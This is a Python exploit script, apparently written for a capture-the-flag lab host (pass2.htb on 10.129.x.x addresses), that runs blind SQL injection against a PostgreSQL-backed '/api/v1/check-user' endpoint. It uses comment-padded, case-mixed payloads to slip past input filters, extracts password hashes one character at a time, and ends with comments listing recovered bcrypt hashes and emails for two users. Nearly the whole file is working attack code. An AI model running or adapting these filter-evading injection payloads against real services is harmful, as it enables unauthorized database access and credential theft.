#!/usr/bin/python3

from pwn import *
from pprint import pprint
import requests
import string


def make_exploit() -> None:
    
    values = string.ascii_lowercase+string.ascii_uppercase+"$./"+"0123456789"
    letters = [x for x in values]
    # username = "$2a$12$cL8f8M6VTPILtTStdqmLrunDy4JW/FbNYVpfJnL"
    username = ""
    p = log.progress("Brute forcing SQL postgres ")
    
    while True:
        
        for x in letters:
            p.status(x+username)
            # payload = f"'//**//**/**/O/**/R//**//**/**/passwOrd//**//**/**/like//**//**/**/'{username+x}%'//**//**/**/liMit//**//**/**/1-/**/-"
            payload = f"'//**//**/**/O/**/R//**//**/**/passwOrd//**//**/**/like//**//**/**/'%{x+username}'//**//**/**/liMit//**//**/**/1-/**/-"
            ress = requests.get(url="http://10.129.25.43:8080/api/v1/check-user?u="+payload)

            if ress.json()["exists"] == True:
                # print(payload)
                username = x+""+username
                break
            else:
                continue


def blind_sqli():
    password = ""
    target_url = "10.129.204.251"
    p = log.progress("Brute forcing SQL postgres password: ")
    for x in range(1, 62):
        p.status(password)
        for number in range(32, 127):
            url = f"http://{target_url}:8080/api/v1/check-user?u=bmdyy'//**//**/**/And//**//**/**/AscII(SUbsTRING(passwoRd,{x},1))={number}-/**/-"
            ress = requests.get(url=url)
            
            if ress.json()["exists"] == True:
                password += chr(number)
                break
            else:
                continue


# admin $%a$%bNYVpfJnL

def main():
    try:
        blind_sqli()
    except Exception as e:
        print(str(e))
        exit(1)
        
    except KeyboardInterrupt:
        exit(0)



if __name__ == "__main__":
    main()




# $%a$%bNYVpfJn$%a%YhIQgG
# $2a$12$cL8f8M6VTPILtTStdqmLrunDy4JW/FbNYVpfJnLjKgU.Sq7Ov1.mWYyn0W8YhIQgG


# password = admin:$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG admin@pass2.htb  Admin Admin
# password = bmdyy:$2a$12$cL8f8M6VTPILtTStdqmLrunDy4JW/FbNYVpfJnLO2XoZGs/c7E2IG bmdyy@pass2.htb  William Moody





